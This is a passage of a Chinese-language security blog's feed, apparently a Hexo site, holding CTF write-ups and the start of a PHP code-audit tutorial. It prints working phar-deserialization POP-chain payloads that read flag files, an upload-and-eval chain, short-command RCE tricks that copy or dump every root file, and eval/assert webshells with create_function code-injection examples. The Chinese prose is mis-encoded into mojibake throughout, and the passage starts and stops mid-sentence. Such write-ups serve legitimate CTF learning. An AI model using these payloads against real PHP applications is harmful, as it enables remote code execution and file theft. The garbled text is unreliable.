class="line">å°†æ–¹æ³•ç»“æœä¿å­˜åˆ°valueå³tableä¸­</span><br><span class="line">æœ€å<span class="keyword">echo</span> <span class="variable">$table</span>;å°±ç›¸å½“äº<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></li><li><p>åˆ°è¿™é‡Œæ€è·¯å°±æ¸…æ™°äº†ã€‚</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æˆ‘ä»¬è®©Userç±»ä¸­çš„<span class="variable">$db</span>ä¸ºFilelistå¯¹è±¡ï¼Œå½“<span class="variable">$db</span>é”€æ¯æ—¶è§¦å‘<span class="title class_">User</span>::<span class="title function_ invoke__">destruct</span>()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨closeæ–¹æ³•ï¼Œä½†æ˜¯<span class="title class_">Filelist</span>::<span class="variable constant_">close</span>ä¸å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘<span class="title class_">Filelist</span>::<span class="variable constant_">call</span>,ä»è€Œè°ƒç”¨<span class="title class_">File</span>::<span class="variable constant_">close</span>,æ‰§è¡Œ<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)ï¼Œæœ€åå°†ç»“æœè¿”å›è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;<span class="comment"># è¿™é‡Œçš„flag.txtæ˜¯å¤šæ¬¡çŒœæµ‹å‡ºæ¥çš„</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®©Userç±»ä¸­çš„$dbä¸ºFilelistå¯¹è±¡</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åå°†ç”Ÿæˆçš„phar.pharä¸Šä¼ (ç›´æ¥ä¿®æ”¹æ–‡ä»¶åç¼€ååä¸Šä¼ æˆ–è€…æŠ“åŒ…ä¿®æ”¹content-type)ä¸ºphar.gifï¼Œç„¶åä½¿ç”¨pharåè®®è®¿é—®æ–‡ä»¶ï¼Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥è®¿é—®ï¼Œdownload.phpå’Œdelete.phpï¼Œå‰é¢åˆ†æè¿‡dowmload.phpå¯¹ç›®å½•å’Œæ–‡ä»¶åä½œäº†é™åˆ¶ï¼Œæ‰€ä»¥ä½¿ç”¨delete.phpæ¥è¿›è¡Œè®¿é—®ã€‚</p><p><img src="/../images/image-20220708203217989-1687419234886.png" alt="image-20220708203217989"></p><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>I&#x2F;Oæ“ä½œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="variable constant_">file_get</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>$valueï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure><p>$keyï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__geté­”æœ¯æ–¹æ³•</span><br><span class="line">æ‰¾è¯»å–ä¸å­˜åœ¨/ä¿æŠ¤çš„å±æ€§</span><br><span class="line"></span><br><span class="line">show::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">è®©str[<span class="string">&#x27;str&#x27;</span>]ä¸ºTestç±»ï¼Œç„¶åTestç±»ä¸‹æ²¡æœ‰sourceå±æ€§å°±ä¼šè§¦å‘<span class="title class_">Test</span>::<span class="variable constant_">__get</span></span><br><span class="line">æ‰€ä»¥<span class="variable">$key</span>=source</span><br><span class="line">    </span><br><span class="line">__toStringæ–¹æ³•</span><br><span class="line">C1e4rä¸‹çš„__destruct <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">ä»¤testä¸ºshow</span><br></pre></td></tr></table></figure><p>POPé“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C1e4r::__destruct â†’ Show::__toString â†’ Test::__get â†’ Test::get  â†’ Test::file_get </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//æ³¨æ„æ„é€ çš„é¡ºåºï¼Œä»popé“¾å°¾åˆ°å¤´</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h4><p><a href="https://blog.csdn.net/qq_54929891/article/details/124785091">https://blog.csdn.net/qq_54929891/article/details/124785091</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Uploaderç±»</span></span><br><span class="line"><span class="comment"># å¦‚æœnameæœ‰èµ‹å€¼ï¼Œå¹¶é€šè¿‡è¿‡æ»¤ï¼Œfilename==nameï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™filename=$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment"># è¿”å›nameæˆ–è€…$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (Ã¢Â€Â²Ã¢Â–Â½`Ã£Â€Âƒ)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># æ¯ä¸€æ¬¡ä¸Šä¼ æ–‡ä»¶ç»“æŸåè§¦å‘</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment">#file_get_contentså’Œechoéƒ½ä¼šè§¦å‘tostringæ–¹æ³•ï¼Œæ‰€ä»¥å®è´¨ä¸Š$uploaderå°±ç­‰ä»·äº$filename</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Ã¤Â¸Â‹Ã©ÂÂ¢Ã¦Â˜Â¯Ã¤Â½Â Ã¤Â¸ÂŠÃ¤Â¼Â Ã§ÂšÂ„Ã¦Â–Â‡Ã¤Â»Â¶Ã¯Â¼Âš&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸€æ¬¡ä¸Šä¼ æ–‡ä»¶ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œå› ä¸ºè¿™æ—¶å€™nameæ²¡æœ‰èµ‹å€¼ï¼Œæ‰€ä»¥filename&#x3D;$sandbox.$_SESSION[â€˜userâ€™].$extï¼Œè€Œä¸”å› ä¸ºç¬¬ä¸€æ¬¡è¿˜æ²¡è§¦å‘destructæ–¹æ³•ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ–‡ä»¶å®è´¨ä¸Šæ˜¯åœ¨tmpç›®å½•ï¼Œå› æ­¤<code>echo file_get_contents($uploader)</code>ä¸ºç©º</p><p>ç¬¬äºŒæ¬¡æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œç¬¬ä¸€æ¬¡ç»“æŸè§¦å‘destructæ–¹æ³•ï¼Œå°±ä¼šæŠŠä¸Šä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶ç§»åˆ°$filenameè·¯å¾„ï¼Œæ‰€ä»¥å°±ä¼šè¾“å‡ºä¸Šä¸€æ¬¡ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p></blockquote><p>ç¬¬ä¸€æ¬¡éšä¾¿ä¸Šä¼ æ–‡ä»¶ï¼Œè·å–<code>$_SESSION[&#39;user&#39;]</code>ï¼Œç”¨äºç»•è¿‡</p><p>ç¬¬äºŒæ¬¡ä¸Šä¼ pharæ–‡ä»¶</p><p>ç¬¬ä¸‰æ¬¡ç”¨nameå‚æ•°ç”¨pharåè®®è®¿é—®pharæ–‡ä»¶ï¼Œé€šè¿‡<code>file_get_contents($uploader)</code>è§¦å‘ååºåˆ—åŒ–å®Œæˆæ”»å‡»</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h2><p>ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946-1687675268129.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686-1687675268129.png" alt="image-20221107112233686"></p><p>ç„¶åå°è¯•è®¿é—®&#x2F;tmp&#x2F;aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜<code>&gt;a</code>å…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚</p><ul><li><p>è§£æ³•1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>cp /* .</code>ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;flagå³å¯</p><p><img src="/../images/image-20221107113239425-1687675268129.png" alt="image-20221107113239425"></p></li><li><p>è§£æ³•2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>nl /*&gt;a</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;aå³å¯</p><p><img src="/../images/image-20221107113608245-1687675268129.png" alt="image-20221107113608245"></p></li><li><p>è§£æ³•3</p><p>ç›´æ¥å†™ğŸ</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡åŸºç¡€</title>
      <link href="/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p><code>&lt;?php eval(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼›</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p><code>&lt;?php assert(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸éœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼›</p><h2 id="evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„"><a href="#evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„" class="headerlink" title="evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„"></a>evalå’ŒassertäºŒè€…åŒºåˆ«â€“æ³¨æ„</h2><p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä½†php7ä¸­ï¼Œ<code>assert</code>ä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼<code>eval</code>ï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç </p><h2 id="preg-replaceçš„-x2F-eæ¨¡å¼"><a href="#preg-replaceçš„-x2F-eæ¨¡å¼" class="headerlink" title="preg_replaceçš„&#x2F;eæ¨¡å¼"></a>preg_replaceçš„&#x2F;eæ¨¡å¼</h2><p>phpç‰ˆæœ¬&lt;5.5</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/pattern/e&#x27;</span>,<span class="variable">$command</span>,<span class="variable">$value</span> );</span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå‘½ä»¤æ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•°</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p><strong>PHP 7.2.0 èµ·è¢«<em>åºŸå¼ƒ</em>ï¼Œå¹¶è‡ª PHP 8.0.0 èµ·è¢«<em>ç§»é™¤</em></strong></p><blockquote><p>æ­¤å‡½æ•°åœ¨å†…éƒ¨æ‰§è¡Œ <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>ï¼Œå› æ­¤å…·æœ‰è·Ÿ <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> ç›¸åŒçš„å®‰å…¨é—®é¢˜ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">ç­‰ä»·äº</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$b</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>å½“<code>$b=1;&#125;phpinfo();/*</code>æ—¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;  </span></span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="comment">/*&#125;  </span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œäº†phpinfo()</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>call_user_func_array()ï¼Œç¬¬äºŒä¸ªå‚æ•°è¦ä¸ºæ•°ç»„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><h2 id="å˜é‡å‡½æ•°"><a href="#å˜é‡å‡½æ•°" class="headerlink" title="å˜é‡å‡½æ•°"></a>å˜é‡å‡½æ•°</h2><p><strong>PHP&lt;7</strong></p><p>å¦‚æœåœ¨ä¸€ä¸ªå˜é‡åé¢åŠ 